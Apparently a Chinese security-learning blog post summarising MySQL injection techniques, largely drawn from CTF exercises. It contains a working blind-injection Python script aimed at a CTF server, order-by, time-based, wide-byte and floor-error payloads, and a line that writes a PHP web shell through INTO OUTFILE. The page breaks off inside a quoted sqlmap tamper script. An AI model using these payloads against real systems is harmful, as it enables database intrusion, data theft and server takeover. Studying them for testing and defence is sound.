@@ -1,0 +1,1115 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="wD6I1h8lGi">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="数据库相关注入语句收集0Mysql Flase Injection，这种注入主要利用了MySQL的隐式类型转换  两个参数进行比较，如果有一个是NULL，那么结果为NULL。 两个NULL进行&amp;lt;=&amp;gt;比较结果为1，使用=比较结果为NULL。 字符串和浮点数进行比较，会先将字符串转化为浮点数。   这种注入方法可以在某些情况下绕过一些过滤 比如过滤了and or | &amp;amp;逻辑运算符，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL数据库注入方法总结">
+<meta property="og:url" content="http://ama666.cn/2019/09/10/MySQL数据库注入方法总结/index.html">
+<meta property="og:site_name" content="ama666">
+<meta property="og:description" content="数据库相关注入语句收集0Mysql Flase Injection，这种注入主要利用了MySQL的隐式类型转换  两个参数进行比较，如果有一个是NULL，那么结果为NULL。 两个NULL进行&amp;lt;=&amp;gt;比较结果为1，使用=比较结果为NULL。 字符串和浮点数进行比较，会先将字符串转化为浮点数。   这种注入方法可以在某些情况下绕过一些过滤 比如过滤了and or | &amp;amp;逻辑运算符，">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190907181420.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190907181734.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190908105253.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190908234353.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190909155107.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190909204915.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190909211940.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910105246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910180533.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910192918.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910192953.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910193115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910193246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910195108.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910195830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910200743.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910201300.png">
+<meta property="og:updated_time" content="2019-09-11T01:19:01.315Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySQL数据库注入方法总结">
+<meta name="twitter:description" content="数据库相关注入语句收集0Mysql Flase Injection，这种注入主要利用了MySQL的隐式类型转换  两个参数进行比较，如果有一个是NULL，那么结果为NULL。 两个NULL进行&amp;lt;=&amp;gt;比较结果为1，使用=比较结果为NULL。 字符串和浮点数进行比较，会先将字符串转化为浮点数。   这种注入方法可以在某些情况下绕过一些过滤 比如过滤了and or | &amp;amp;逻辑运算符，">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190907181420.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://ama666.cn/2019/09/10/MySQL数据库注入方法总结/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>MySQL数据库注入方法总结 | ama666</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ama666</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">平时多喝点茶</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2019/09/10/MySQL数据库注入方法总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安大侠">
+      <meta itemprop="description" content="每天挣扎的活着">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ama666">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MySQL数据库注入方法总结
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-10 20:17:47" itemprop="dateCreated datePublished" datetime="2019-09-10T20:17:47+08:00">2019-09-10</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-11 09:19:01" itemprop="dateModified" datetime="2019-09-11T09:19:01+08:00">2019-09-11</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/小白成长计划/" itemprop="url" rel="index"><span itemprop="name">小白成长计划</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="数据库相关注入语句收集"><a href="#数据库相关注入语句收集" class="headerlink" title="数据库相关注入语句收集"></a>数据库相关注入语句收集</h1><h3 id="0"><a href="#0" class="headerlink" title="0"></a>0</h3><p>Mysql Flase Injection，这种注入主要利用了MySQL的<strong>隐式类型转换</strong></p>
+<ul>
+<li>两个参数进行比较，如果有一个是NULL，那么结果为NULL。</li>
+<li>两个NULL进行&lt;=&gt;比较结果为1，使用=比较结果为NULL。</li>
+<li>字符串和浮点数进行比较，会先将字符串转化为浮点数。</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190907181420.png" alt></p>
+<p>这种注入方法可以在某些情况下绕过一些过滤</p>
+<p>比如过滤了<strong>and or | &amp;</strong>逻辑运算符，可以使用异或^来绕过登陆判断</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190907181734.png" alt></p>
+<p>因为异或运算符的优先级要高于等于号，首先进行<strong>‘hack’^0</strong>的运算，字符串hack会被强制转换为浮点数0，0异或0为0.接着再进行比较运算，字符串password会被强制转换为浮点数0，0与0相等，比较结果为1。</p>
+<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>过滤了<strong>and、or</strong>，可以使用<strong>&amp;&amp;、||</strong>绕过</p>
+<p>过滤了空格，可以使用括号绕过</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190908105253.png" alt></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((<span class="keyword">select</span>(<span class="keyword">left</span>((<span class="keyword">select</span>(flag)<span class="keyword">from</span>(ce63e444b0d049e9c899c9a0336b3c59)),<span class="number">3</span>))<span class="keyword">like</span>(<span class="number">0x2562</span>)),<span class="keyword">name</span>,price)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>利用left和like进行盲注</p>
+<blockquote>
+<p>left是返回查询结果左边n个字符</p>
+<p>if(expre1,expre2,expre3);当expre1为真，返回expre2，否则返回expre3</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190908234353.png" alt></p>
+<p>这其实是一道CTF题中的payload，不如让我们分析一下整个EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line">url = <span class="string">"http://202.120.7.197/"</span></span><br><span class="line">cookie = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'qlqmjbq7uglcr0onm1lmm4ndg4'</span>&#125;</span><br><span class="line">r=requests.get(url+<span class="string">'app.php?action=search&amp;keyword=&amp;order=if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)'</span>, cookies=cookie)</span><br><span class="line">err = r.text</span><br><span class="line">s = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\'"_%'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(payload)</span>:</span></span><br><span class="line">	cookie = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'qlqmjbq7uglcr0onm1lmm4ndg4'</span>&#125;</span><br><span class="line">	r=requests.get(url+<span class="string">'app.php?action=search&amp;keyword=&amp;order='</span>+payload, cookies=cookie)</span><br><span class="line">	<span class="keyword">return</span> r.text</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">		payload = <span class="string">"if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%s))like(0x25%s)),name,price)"</span> % (str(m), hex(ord(i))[<span class="number">2</span>:])</span><br><span class="line">		<span class="keyword">if</span> check(payload) != err:</span><br><span class="line">			flag +=i</span><br><span class="line">			<span class="keyword">print</span> flag</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本前面捕获了一个注入无结果的返回值<strong>err</strong>，并定义了字典<strong>s</strong>。接下来使用两层嵌套循环构造payload，第一个参数<strong>%s</strong>处是限制<strong>left</strong>函数截取的长度，第二个参数将字符串中的字符转化为16进制之后拼接入payload。整个payload的含义就是从表中取flag，逐字符猜解flag；如果猜解正确则返回<strong>name</strong>，猜解错误返回<strong>price</strong>。推测是因为前端没办法直接看到注入回显，所以只能用盲注的方法，通过影响页面其他可见部分来间接看到flag。</p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>Order by注入。注入点在sql语句中<strong>order by</strong>之后，如</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> goods <span class="keyword">order</span> <span class="keyword">by</span> $_GET[<span class="string">'order'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>一般在注入中，order by的作用是探测被注入表的行数，和union配合进行注入。在不知道列名的时候，可以使用序号作为指代。</p>
+<p>order by注入跟上一个False注入有些类似，中心思想就是通过添加条件判断语句，观察order by结果的不同获取数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">order by IF(1=1,name,price) <span class="comment">-- 通过name字段排序</span></span><br><span class="line">order by (1=2,name,price) <span class="comment">-- 通过price字段排序</span></span><br><span class="line"></span><br><span class="line">order by (CASE+WHEN+(1=1)+THEN+name+ELSE+price+<span class="keyword">END</span>) <span class="comment">-- 通过name字段排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">CASE</span>+<span class="keyword">WHEN</span>+(<span class="number">1</span>=<span class="number">2</span>)+<span class="keyword">THEN</span>+<span class="keyword">name</span>+<span class="keyword">ELSE</span>+price+<span class="keyword">END</span>) <span class="comment">-- 通过price字段排序</span></span><br></pre></td></tr></table></figure>
+
+<p>判断条件可以根据想获取的数据来自定义。如果无法直观的看到order by排序的差别，可以使用类似</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">order by (1=1,1,(<span class="keyword">select</span>+<span class="number">1</span>+<span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">2</span>)) <span class="comment">-- 正确</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> (<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span>+<span class="number">1</span>+<span class="keyword">union</span>+<span class="keyword">select</span>+<span class="number">2</span>)) <span class="comment">-- 错误</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> updatexml(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>) <span class="comment">-- 正确</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> updatexml(<span class="number">1</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>) <span class="comment">-- 错误</span></span><br></pre></td></tr></table></figure>
+
+<p>这样的语句，人工制造一个正确/错误页面</p>
+<p>其中updatexml也是一种注入方法，可以参考我的<a href="https://ama666.cn/2018/09/23/MYSQL%E6%95%B0%E7%BB%84%E5%BA%93UpdateXml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">一篇文章</a>。</p>
+<p>order by注入还可以产生拒绝服务攻击</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(count,exp)</span><br></pre></td></tr></table></figure>
+
+<p>它会执行count次表达式exp。</p>
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><strong>lpad/rpad</strong></p>
+<p>字符串填充函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpad(str,len,padstr)		<span class="comment">-- 使用padstr在str左侧将字符串填充置len长度</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190909155107.png" alt></p>
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>判断已知表的字段数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> * <span class="keyword">from</span>  [已知表])=<span class="number">1</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>通过观察报错直接看字段数</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190909204915.png" alt></p>
+<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>查表名，能看到回显的直接从information_schema.tables里面查</p>
+<p>也可以通过写脚本的方法猜解表名，具体方法前面总结果了</p>
+<p>没有回显的话可以通过时间盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((<span class="keyword">select</span> <span class="keyword">substr</span>(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables&gt;<span class="string">'A'</span>),<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><strong>concat</strong>和<strong>concat_ws</strong>函数可以将字符拼接为字符串</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190909211940.png" alt></p>
+<h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><strong>LOAD_FILE</strong>和<strong>OUTFILE</strong>可以向本地读写文件，读文件有一些限制，并且这个函数在我的<a href="https://ama666.cn/2019/08/23/%E7%AC%AC%E5%9B%9B%E5%91%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/#more">一篇文章</a>里有详细的介绍。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select '&lt;?php system('$_GET['command']); /&gt;' into outfile '/var/www/html/shell.php';</span><br></pre></td></tr></table></figure>
+
+<p>可以使用outfile写这样的php一句话后门</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910105246.png" alt></p>
+<p>高版本的MySQL由于有<code>security-file-priv</code>的存在，需要将其关闭或者写在此变量设置的目录下才可以。</p>
+<h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>宽字节注入，原理就是编码问题。这种情况主要在国内发生的比较多，因为采用了<code>gbk</code>编码，如果使用了<strong>addslashes</strong>函数进行过滤给引号<code>&#39;</code>加上反斜杠<code>\</code>进行转义。因为反斜杠的gbk编码为<code>%5c</code>，在你输入<code>%bf%27</code>时，函数遇到单引号自动加入反斜杠进行转义，此时变为<code>%bf%5c%27</code>，<code>%bf%5c</code>在gbk中变为一个宽字符“縗”。</p>
+<h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p>利用<strong>count、floor、group by</strong>的组合报错获取数据</p>
+<p>首先看一下最基本的floor注入的语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) ,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)x <span class="keyword">from</span> information <span class="keyword">group</span> <span class="keyword">by</span> x；</span><br></pre></td></tr></table></figure>
+
+<p>这个语句中<code>floor(rand(0)*2)x</code>中的<code>x</code>是为<code>floor(rand(0)*2)</code>这张表格命名的一个别名</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910180533.png" alt></p>
+<p><strong>rand</strong>函数的作用是产生0-1的随机数，而<strong>floor</strong>函数的作用是将浮点数向下取整，让把rand函数产生的随机数进行平方之后，floor函数取整的结果就限制在了0和1之间。</p>
+<p>使用<strong>concat_ws</strong>拼接数据表中的一列</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910192918.png" alt></p>
+<p>数据表中有几行，<code>floor(rand()*2)</code>就执行几次</p>
+<p>使用<code>group by</code>进行排序</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910192953.png" alt></p>
+<p>使用<strong>count</strong>函数统计数量</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910193115.png" alt></p>
+<p>如果将随机因子<code>floor(rand()*2)</code>去掉的话</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910193246.png" alt></p>
+<p>则不会报错。该报错的原理很复杂</p>
+<p>在mysql在遇到select count(*) from tables group by x;这语句的时候会建立一个虚拟表</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910195108.png" alt></p>
+<ol>
+<li><p>在计算<strong>count</strong>的时候会先查询虚拟表，如果其中的<code>key</code>已经存在，那么直接在<code>count(*)</code>处加一；不存在的话就根据查询到的要计数的值创建一个新的<code>key</code>。</p>
+</li>
+<li><p><code>floor(rand(0)*2)</code>产生的序列是固定的<code>011011011011......</code></p>
+</li>
+<li><p>mysql官方有给过提示，就是查询的时候如果使用rand()的话，该值会被计算多次，那这个“被计算多次”到底是什么意思，就是在使用group by的时候，<code>floor(rand(0)*2)</code>会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次</p>
+</li>
+</ol>
+<p>有了以上三点之后就可以进行分析</p>
+<ul>
+<li><p>首先查询第一条记录，<code>floor(rand(0)*2)</code>第一次被执行生成<code>0</code>，查询到虚拟表中没有<code>key</code>为0的记录，于是根据特性<strong>3</strong>再执行一次<code>floor(rand(0)*2)</code>，生成<code>1</code>，将<code>1</code>作为<code>key</code>插入到虚拟表之中，此时虚拟表如下</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910195830.png" alt></p>
+</li>
+<li><p>然后进行第二次查询，注意这里不是查询虚拟表而是执行<strong>select</strong>语句。此时执行到了第三次<code>floor(rand(0)*2)</code>，生成<code>1</code>，然后查询虚拟表发现<code>key</code>为<code>1</code>的记录已经存在了，所以不需要再次执行<code>floor(rand(0)*2)</code>，直接在<code>count(*)</code>处加一，此时的虚拟表如下</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910200743.png" alt></p>
+</li>
+<li><p>进行第三次查询(select)，执行第四次<code>floor(rand(0)*2)</code>，生成<code>0</code>，查询虚拟表发现<code>key</code>为<code>0</code>的记录不存在，于是执行第五次<code>floor(rand(0)*2)</code>，<strong>生成<code>1</code>并插入虚拟表，可此时虚拟表中<code>key</code>为<code>1</code>的记录已经存在了，注意这里不是进行<code>count</code>计数而是直接插入，造成了主键重复的错误</strong>。</p>
+</li>
+</ul>
+<p>至此执行了三次查询(select)，五次<code>floor(rand(0)*2)</code>，造成了MySQL虚拟表主键重复报错从而获取数据。</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190910201300.png" alt></p>
+<h3 id="tamper编写"><a href="#tamper编写" class="headerlink" title="tamper编写"></a>tamper编写</h3><p>我们可以看看在实际注入中经常使用的space2comment.py这个tamper</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'LICENSE' for copying permission</span></span><br><span class="line"><span 